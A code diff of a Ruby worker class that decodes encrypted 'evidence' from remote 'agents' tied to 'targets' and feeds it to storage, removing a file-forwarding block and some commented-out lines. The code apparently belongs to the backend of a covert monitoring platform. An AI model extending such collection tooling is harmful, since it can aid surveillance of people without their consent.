@@ -81,11 +81,6 @@ class InstanceWorker
             # deserialize binary evidence and forward decoded
             evidences, action = begin
               RCS::Evidence.new(@key).deserialize(raw) do |data|
-                if forwarding?
-                  path = "forwarded/#{evidence_id}.dec"
-                  f = File.open(path, 'wb') {|f| f.write data}
-                  trace :debug, "[#{evidence_id}:#{@ident}:#{@instance}] forwarded decoded evidence #{evidence_id} to #{path}"
-                end
               end
             rescue EmptyEvidenceError => e
               trace :info, "[#{evidence_id}:#{@ident}:#{@instance}] deleting empty evidence #{evidence_id}"
@@ -142,13 +137,9 @@ class InstanceWorker
 
               begin
                 evidence = processor.feed ev
-                #RCS::DB::Alerting.new_evidence evidence unless evidence.nil?
               rescue Exception => e
                 trace :error, "[#{evidence_id}:#{@ident}:#{@instance}] cannot store evidence, #{e.message}"
                 trace :error, "[#{evidence_id}:#{@ident}:#{@instance}] #{e.backtrace}"
-                #trace :debug, "[#{evidence_id}:#{@ident}:#{@instance}] refreshing agent and target information and retrying."
-                #get_agent_target
-                #retry if attempt ||= 0 and attempt += 1 and attempt < 3
               end
 
             end
@@ -191,7 +182,6 @@ class InstanceWorker
   
   def put_to_sleep
     @state = :stopped
-    #RCS::EvidenceManager.instance.sync_status({:instance => @agent['instance']}, RCS::EvidenceManager::SYNC_IDLE)
     trace :debug, "processor #{@agent['ident']}:#{@agent['instance']} is sleeping too much, let's stop!"
   end
   
